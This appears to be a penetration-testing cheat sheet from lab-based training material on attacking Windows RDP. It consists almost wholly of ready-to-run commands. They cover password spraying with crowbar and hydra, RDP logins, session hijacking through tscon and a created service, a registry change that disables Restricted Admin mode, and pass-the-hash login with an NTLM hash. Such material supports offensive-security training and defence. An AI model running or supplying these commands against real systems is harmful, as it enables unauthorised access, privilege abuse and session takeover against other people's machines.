# Attacking RDP

## Password Spraying

```bash
bluechat@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
bluechat@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## RDP Login

```bash
bluechat@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
bluechat@htb[/htb]# xfreerdp /v:192.168.2.143 /u:admin /p:password123 -clipboard
```

## Protocol-Specific Attacks


### RDP Session Hijacking

```
as admin:

query user

SESSIONNAME ID STATE IDLE-TIME ETC...

C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

### Creating a Local Service as Admin

```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
C:\htb> net start sessionhijack
```

### RDP Pass-the-Hash for GUI applications

Note: Be aware of "Restricted Admin Mode" covered in the PtH section

```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```bash
bluechat@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

